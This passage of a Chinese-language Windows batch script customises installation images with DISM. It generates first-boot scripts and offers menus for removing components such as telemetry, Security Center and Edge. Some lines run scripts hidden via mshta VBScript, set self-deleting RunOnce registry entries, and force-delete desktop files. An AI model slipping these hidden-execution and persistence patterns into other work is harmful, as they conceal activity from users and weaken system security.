echo echo HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce [1 7 17]^>"%%~dp0RecoveryRunOnce.ini" >> "!SetupComplete!"
echo regini "%%~dp0LocRunOnce.ini" >> "!SetupComplete!"
if exist "!ScriptsLog!\USB.log" type "!ScriptsLog!\USB.log" >> "!SetupComplete!"
echo wmic csproduct get Name /value^|findstr /i "MacBook iMac Macmini MacPro" ^&^& goto :Next >> "!SetupComplete!"
if exist "!ScriptsLog!\DrvCeonwOut.log" type "!ScriptsLog!\DrvCeonwOut.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\EasyDrvOut.log" type "!ScriptsLog!\EasyDrvOut.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\DrvCeonwIn.log" type "!ScriptsLog!\DrvCeonwIn.log" >> "!SetupComplete!"
if exist "!ScriptsLog!\EasyDrvIn.log" type "!ScriptsLog!\EasyDrvIn.log" >> "!SetupComplete!"
echo :Next >> "!SetupComplete!"
if exist "!ScriptsLog!\App" FOR %%i in ("!ScriptsLog!\App\*.log") do (type "%%i" >> "!SetupComplete!")
echo regini "%%~dp0RecoveryRunOnce.ini" >> "!SetupComplete!"
echo wmic csproduct get Name /value^|findstr /i "MacBook iMac Macmini MacPro" ^|^| goto :Clear >> "!SetupComplete!"
echo :Mac >> "!SetupComplete!"
if exist "!ScriptsLog!\StartBootCamp.log" type "!ScriptsLog!\StartBootCamp.log" >> "!SetupComplete!"
echo :Clear >> "!SetupComplete!"
echo del /f /q /ar "!PUBLIC!\Desktop\*.*" >> "!SetupComplete!"
echo del /f /q /ar "!SystemDrive!\Users\Default\Desktop\*.*" >> "!SetupComplete!"
echo SHUTDOWN /R /T 0 >> "!SetupComplete!"
echo ping -n 999 127.0.0.1^>nul >> "!SetupComplete!"

if exist "!ScriptsLog!\Wallpaper.log" type "!ScriptsLog!\Wallpaper.log" >> "!SetupComplete!"

echo @echo off^&setlocal EnableDelayedExpansion > "!RunOnce!"
echo bcdedit /timeout 3 >> "!RunOnce!"
echo reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "FirstRun" /t REG_SZ /d "mshta vbscript:createobject(\"wscript.shell\").run(\"%%windir%%\Sysprep\FirstRun.cmd\",0)(window.close)" /f >> "!RunOnce!"
echo if exist "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat" call "%%ProgramFiles%%\SysCeo\DrvCeo\uninstall.bat"^&rd /s /q "%%ProgramFiles%%\SysCeo" >> "!RunOnce!"
if exist "!ScriptsLog!\AppAfter.log" type "!ScriptsLog!\AppAfter.log" >> "!RunOnce!"
echo rd /s /q %%windir%%\Setup\Scripts >> "!RunOnce!"
if exist "!ScriptsLog!\Autoclean.log" type "!ScriptsLog!\Autoclean.log" >> "!RunOnce!"
if exist "!ScriptsLog!\Wallpaper.log" type "!ScriptsLog!\Wallpaper.log" >> "!RunOnce!"
echo del /f /q %%0 >> "!RunOnce!"

echo @echo off^&setlocal EnableDelayedExpansion > "!Firstrun!"
echo bcdedit /timeout 3 >> "!Firstrun!"
:: echo md "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu" >> "!Firstrun!"
:: echo echo y^|cacls "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" /t /p everyone:n >> "!Firstrun!"
:: echo echo y^|cacls "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu" /t /p everyone:n >> "!Firstrun!"
:: echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "TaskBar" /t REG_SZ /d "cmd.exe /c echo y|cacls \"%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\" /t /p everyone:f" /f >> "!Firstrun!"
:: echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "StartMenu" /t REG_SZ /d "cmd.exe /c echo y|cacls \"%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu\" /t /p everyone:f" /f >> "!Firstrun!"
if exist "!Sysprep!\Windows Explorer.lnk" echo copy /v /y "%%windir%%\Sysprep\Windows Explorer.lnk" "%%USERPROFILE%%\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar" ^&^& del /q "%%windir%%\Sysprep\Windows Explorer.lnk" >> "!Firstrun!"
echo del /f /q /ar "%%PUBLIC%%\Desktop\*.*" >> "!Firstrun!"
echo del /f /q /ar "%%USERPROFILE%%\Desktop\*.*" >> "!Firstrun!"
if exist "!ScriptsLog!\IeHome.log" type "!ScriptsLog!\IeHome.log" >> "!Firstrun!"
if exist "!ScriptsLog!\Update.log" type "!ScriptsLog!\Update.log" >> "!Firstrun!"
if exist "!ScriptsLog!\Serving.log" type "!ScriptsLog!\Serving.log" >> "!Firstrun!"
echo wmic csproduct get Name /value^|findstr /i "MacBook iMac Macmini MacPro" ^&^& goto :Mac >> "!Firstrun!"
if exist "Mount\Windows\BootCamp.cmd" echo del /f /q %%windir%%\BootCamp.cmd >> "!Firstrun!"
if exist "Mount\Windows\Apple.cmd" echo del /f /q %%windir%%\Apple.cmd >> "!Firstrun!"
if exist "Mount\Windows\DrvCeo.cmd" echo mshta vbscript:CreateObject^("WScript.Shell"^).Run^("cmd /c %%windir%%\DrvCeo.cmd",0^)^(window.close^) >>"!Firstrun!"
echo goto :clear >> "!Firstrun!"
echo :Mac >> "!Firstrun!"
if exist "Mount\Windows\DrvCeo.cmd" echo del /f /q %%windir%%\DrvCeo.cmd >> "!Firstrun!"
echo if exist "%%Windir%%\BootCamp.cmd" call "%%Windir%%\BootCamp.cmd"^&^&del /f /q "%%Windir%%\BootCamp.cmd" >> "!Firstrun!"
if exist "Mount\Windows\Apple.cmd" echo mshta vbscript:CreateObject^("WScript.Shell"^).Run^("cmd /c %%windir%%\Apple.cmd",0^)^(window.close^) >> "!Firstrun!"
echo :clear >> "!Firstrun!"
if exist "!ScriptsLog!\Autoclean.log" type "!ScriptsLog!\Autoclean.log" >> "!Firstrun!"
echo reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "clean1" /t REG_SZ /d "cmd.exe /c rd /s /q %%windir%%\Sysprep & rd /s /q %%windir%%\Driver & del /f /q %%windir%%\Apple.cmd & del /f /q %%windir%%\DrvCeo.cmd" /f >> "!Firstrun!"
echo del /f /q %%0^&exit >> "!Firstrun!"
REM for /f "tokens=4 delims= " %%i in ('Dism.exe /English /Get-MountedImageInfo:"Mount" ^| find /i "Image Index : "') do (set "index=%%i")
cls && echo. && echo.正在保存并卸载映像中，请稍等...
if exist "!ScriptsLog!" rd /s /q "!ScriptsLog!" >nul 2>nul
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
taskkill /f /IM explorer.exe >nul 2>nul && start "" explorer.exe
"!Dism!" /unmount-image /mountdir:"Mount" /commit
REM "!Dism!" /Cleanup-Mountpoints
rd /s /q "Mount" >nul 2>nul
if not exist "NewImage" md "NewImage" >nul 2>nul
cls&echo.&echo.正在优化并导出新的映像，请稍等...
"!Dism!" /Export-Image /SourceImageFile:"Image\install.wim" /SourceIndex:1 /DestinationImageFile:"NewImage\install.wim" /Compress:max
rd /s /q "!ScriptsLog!" >nul 2>nul
rd /s /q "Image" >nul 2>nul
cls && echo. && echo.新映像导出完成，文件位于[NewImage]文件夹内，名称为install.wim。 && echo. && echo.请按任意键返回... && pause>nul
start "" explorer.exe "NewImage"
goto :begin

:RemoveMenu
reg query HKLM\ZTM >nul 2>nul||reg load HKLM\ZTM "Mount\Windows\System32\config\software" >nul 2>nul
start /b "" "!ToolsPath!\NSudo.exe" -U:T -P:E -CurrentDirectory:!-! "File\Bin\x64\Remove.cmd" !+! !ToolsPath!
goto :menu2



if exist "Mount\Windows\SysWOW64" (set "Bit=64") else (set "Bit=86")
for /f "tokens=4 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ProductName" 2^>nul') do set "Version=%%i"
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "CurrentBuild" 2^>nul') do set "ImageBuild=%%i"
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "EditionID" 2^>nul') do set "ImageFlag=%%i"
for /f "tokens=3 delims= " %%i in ('reg query "HKLM\ZTM\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId" 2^>nul') do set "ReleaseId=%%i"
echo !ReleaseId!|Findstr /i "1809 1903 1909 2004" >nul 2>nul||(cls&echo.&echo.精简功能目前仅适用于Windows10 1809/1903/1909/2004，当前挂载的是Windows!Version!...&echo.&echo.请按任意键返回...&pause>nul&goto :menu2)
cls&mode con cols=80 lines=30&title 精简菜单
set "goto="
set "Item="
set "Component="
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\ZTM >nul 2>nul
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    _______________________________ 精简菜单 _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] 多 媒 体                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] 隐私组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] 系统组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] 远程控制                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [5] 系统应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [6] Windows应用                                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:123456X /n /m ">>>>>>>请输入选择:" 
	if !errorlevel!==7 goto :menu2
	if !errorlevel!==6 goto :RemoveWindowsAppsMenu
	if !errorlevel!==5 goto :RemoveSystemAppsMenu
	if !errorlevel!==4 goto :RemoveRemotingMenu
	if !errorlevel!==3 goto :RemoveSystemMenu
	if !errorlevel!==2 goto :RemovePrivacyMenu
	if !errorlevel!==1 goto :RemoveMultimediaMenu
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    _______________________________ 精简菜单 _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] 多 媒 体                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] 隐私组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] 系统组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] 远程控制                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [5] 系统应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [6] Windows应用                                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:123456X /n /m ">>>>>>>请输入选择:" 
	if !errorlevel!==7 goto :menu2
	if !errorlevel!==6 goto :RemoveWindowsAppsMenu
	if !errorlevel!==5 goto :RemoveSystemAppsMenu
	if !errorlevel!==4 goto :RemoveRemotingMenu
	if !errorlevel!==3 goto :RemoveSystemMenu
	if !errorlevel!==2 goto :RemovePrivacyMenu
	if !errorlevel!==1 goto :RemoveMultimediaMenu
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    _______________________________ 精简菜单 _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] 多 媒 体                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] 隐私组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] 系统组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] 远程控制                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [5] 系统应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [6] Windows应用                                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:123456X /n /m ">>>>>>>请输入选择:" 
	if !errorlevel!==7 goto :menu2
	if !errorlevel!==6 goto :RemoveWindowsAppsMenu
	if !errorlevel!==5 goto :RemoveSystemAppsMenu
	if !errorlevel!==4 goto :RemoveRemotingMenu
	if !errorlevel!==3 goto :RemoveSystemMenu
	if !errorlevel!==2 goto :RemovePrivacyMenu
	if !errorlevel!==1 goto :RemoveMultimediaMenu
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" (
	echo.        
	echo.    _______________________________ 精简菜单 _______________________________
	echo.   ^|                               ----------                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [1] 系统组件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [2] 远程控制                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [3] 系统应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [4] Windows 应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /c:1234X /n /m ">>>>>>>请输入选择:" 
	if !errorlevel!==5 goto :menu2
	if !errorlevel!==4 goto :RemoveMultimediaMenu
	if !errorlevel!==3 goto :RemoveSystemAppsMenu
	if !errorlevel!==2 goto :RemoveRemotingMenu
	if !errorlevel!==1 goto :RemoveSystemMenu
)

:RemoveMultimediaMenu
cls&mode con cols=80 lines=30&title 精简多媒体组件
set "goto=:RemoveMultimediaMenu"
echo.        
echo.    ______________________________ 多媒体组件 ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] Adobe Flash                                                      ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] 首次登录动画                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] 游戏浏览器 ^| 需要 Microsoft 游戏                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] 截图工具                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] 语音识别 ^| 需要 Cortana                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] Windows Media Player                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] Windows 照片查看器                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] Windows 系统评估工具 ^| 需要 Microsoft 游戏                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] 移除以上全部组件                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:ABCDEFGHIX /N /M ">>>>>>>请输入选择:"
if !errorlevel!==10 goto :RemoveMenu
if !errorlevel!==9 set "Component=MultimediaComponents"
if !errorlevel!==8 set "Component=WinSAT"
if !errorlevel!==7 set "Component=WindowsPhotoViewer"
if !errorlevel!==6 set "Component=WindowsMediaPlayer"
if !errorlevel!==5 set "Component=SpeechRecognition"
if !errorlevel!==4 set "Component=SnippingTool"
if !errorlevel!==3 set "Component=GameExplorer"
if !errorlevel!==2 set "Component=FirstLogonAnimation"
if !errorlevel!==1 set "Component=AdobeFlashForWindows"
goto :RemoveWindowsComponents

:RemovePrivacyMenu
cls&mode con cols=80 lines=36&title 精简隐私组件
set "goto=:RemovePrivacyMenu"
echo.        
echo.    _______________________________ 隐私组件 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] 分配的访问权限                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] 客户体验改善计划 ^(CEIP^)                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] 人脸识别                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] 内核调试 ^| 依赖于：Windows 错误报告                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] 定位服务                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] 图片密码                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] Pin 登录支持                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] 统一遥测客户端 ^(Asimov^) ^| 依赖于：Windows 错误报告               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] WiFi Network Manager ^(WiFi 感知^)                                 ^|
echo.   ^|                                                                        ^|
if "!ImageBuild!" equ "17763" (
echo.   ^|   [J] Windows 错误报告                                                 ^|
echo.   ^|                                                                        ^|
)
if "!ImageBuild!" neq "17763" (
echo.   ^|   [J] Windows 错误报告 ^| 需要全新体验应用程序                          ^|
echo.   ^|                                                                        ^|	
)
echo.   ^|   [K] Windows 会员中心                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [L] 移除以上全部组件                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:ABCDEFGHIJKLX /N /M ">>>>>>>请输入选择:"
if !errorlevel!==13 goto :RemoveMenu
if !errorlevel!==12 set "Component=PrivacyComponents"
if !errorlevel!==11 set "Component=WindowsInsiderHub"
if !errorlevel!==10 set "Component=WindowsErrorReporting"
if !errorlevel!==9  set "Component=WiFiNetworkManager"
if !errorlevel!==8  set "Component=UnifiedTelemetryClient"
if !errorlevel!==7  set "Component=PinEnrollment"
if !errorlevel!==6  set "Component=PicturePassword"
if !errorlevel!==5  set "Component=LocationService"
if !errorlevel!==4  set "Component=KernelDebugging"
if !errorlevel!==3  set "Component=FaceRecognition"
if !errorlevel!==2  set "Component=CEIP_SQM"
if !errorlevel!==1  set "Component=AssignedAccess"
goto :RemoveWindowsComponents

:RemoveRemotingMenu
cls&mode con cols=80 lines=30&title 精简远程组件
set "goto=:RemoveRemotingMenu"
echo.        
echo.    _______________________________ 远程组件 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 家庭组                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] MultiPoint Connector                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 远程协助                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 移除以上全部组件                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:1234X /N /M ">>>>>>>请输入选择:"
if !errorlevel!==5 goto :RemoveMenu
if !errorlevel!==4 set "Component=RemotingComponents"
if !errorlevel!==3 set "Component=RemoteAssistance"
if !errorlevel!==2 set "Component=MultiPointConnector"
if !errorlevel!==1 set "Component=HomeGroup"
goto :RemoveWindowsComponents

:RemoveSystemMenu
cls&mode con cols=80 lines=40&title 精简系统组件
set "goto=:RemoveSystemMenu"
echo.        
echo.    _______________________________ 系统组件 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [A] 设备锁定 ^(嵌入式体验^)                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   [B] 轻松访问主题                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [C] 轻松传送                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [D] 文件历史记录                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [E] 手动安装程序 ^(就地升级^)                                          ^|
echo.   ^|                                                                        ^|
echo.   ^|   [F] 画图工具                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [G] 安全中心 ^| 依赖于：Windows Defender                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [H] 步骤记录器                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [I] 系统恢复                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [J] Windows 备份                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [K] 适用于 Linux 的 Windows 子系统                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [L] Windows To Go                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [M] 写字板                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [N] 移除以上全部组件                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:ABCDEFGHIJKLMNX /N /M ">>>>>>>请输入选择:"
if !errorlevel!==15 goto :RemoveMenu
if !errorlevel!==14 set "Component=SystemComponents"
if !errorlevel!==13 set "Component=Wordpad"
if !errorlevel!==12 set "Component=WindowsToGo"
if !errorlevel!==11 set "Component=WindowsSubsystemForLinux"
if !errorlevel!==10 set "Component=WindowsBackup"
if !errorlevel!==9  set "Component=SystemRestore"
if !errorlevel!==8  set "Component=StepsRecorder"
if !errorlevel!==7  set "Component=SecurityCenter"
if !errorlevel!==6  set "Component=Paint"
if !errorlevel!==5  set "Component=ManualSetup"
if !errorlevel!==4  set "Component=FileHistory"
if !errorlevel!==3  set "Component=EasyTransfer"
if !errorlevel!==2  set "Component=EaseOfAccessThemes"
if !errorlevel!==1  set "Component=DeviceLockdown"
goto :RemoveWindowsComponents

:RemoveSystemAppsMenu
cls&mode con cols=80 lines=30&title 系统应用
set "goto="
echo.        
echo.    _______________________________ 系统应用 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 系统应用一                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 系统应用二                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ">>>>>>>请输入选择:"
if !errorlevel!==3 goto :RemoveMenu
if !errorlevel!==2 goto :RemoveSystemAppsMenu2
if !errorlevel!==1 goto :RemoveSystemAppsMenu1

:RemoveSystemAppsMenu1
cls&mode con cols=80 lines=40&title 精简系统应用一
set "goto=:RemoveSystemAppsMenu1"
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    ______________________________ 系统应用一 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 指定访问锁定应用 ^| 依赖于：分配的访问权限                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX 代理插件                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 生物注册应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Content Delivery Manager ^| 需要全新体验应用程序                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Cortana、开始菜单和设置搜索应用 ^| 依赖于：语音识别               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Edge 开发者工具客户端                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 目视控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] 文件资源管理器应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] 锁屏应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 地图控件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps1"
	if !errorlevel!==12 set "Component=NarratorQuickStart"
	if !errorlevel!==11 set "Component=MapControl"
	if !errorlevel!==10 set "Component=LockApp"
	if !errorlevel!==9  set "Component=FileExplorer"
	if !errorlevel!==8  set "Component=ECApp"
	if !errorlevel!==7  set "Component=EdgeDevToolsClient"
	if !errorlevel!==6  set "Component=Cortana"
	if !errorlevel!==5  set "Component=ContentDeliveryManager"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    ______________________________ 系统应用一 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 指定访问锁定应用 ^| 依赖于：分配的访问权限                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX 代理插件                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 生物注册应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Content Delivery Manager ^| 需要全新体验应用程序                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Cortana、开始菜单和设置搜索应用 ^| 依赖于：语音识别               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Edge 开发者工具客户端                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] 目视控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] 文件资源管理器应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] 锁屏应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 地图控件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps1"
	if !errorlevel!==12 set "Component=NarratorQuickStart"
	if !errorlevel!==11 set "Component=MapControl"
	if !errorlevel!==10 set "Component=LockApp"
	if !errorlevel!==9  set "Component=FileExplorer"
	if !errorlevel!==8  set "Component=ECApp"
	if !errorlevel!==7  set "Component=EdgeDevToolsClient"
	if !errorlevel!==6  set "Component=Cortana"
	if !errorlevel!==5  set "Component=ContentDeliveryManager"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ______________________________ 系统应用一 ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] 指定访问锁定应用 ^| 依赖于：分配的访问权限                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX 代理插件                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] 生物注册应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] 连接应用                                                         ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Content Delivery Manager ^| 需要全新体验应用程序                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Cortana、开始菜单和设置搜索应用 ^| 依赖于：语音识别               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Edge                                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] 目视控制应用                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] 文件资源管理器应用                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] 锁屏应用                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] 地图控件                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] 移除以上全部选项                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] 返回                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNX /N /M ">>>>>>>请输入选择:"
	if !errorlevel!==15 goto :RemoveSystemAppsMenu
	if !errorlevel!==14 set "Component=SystemApps1"
	if !errorlevel!==13 set "Component=NarratorQuickStart"
	if !errorlevel!==12 set "Component=MapControl"
	if !errorlevel!==11 set "Component=LockApp"
	if !errorlevel!==10 set "Component=FileExplorer"
	if !errorlevel!==9  set "Component=ECApp"
	if !errorlevel!==8  set "Component=Edge"
	if !errorlevel!==7  set "Component=Cortana"
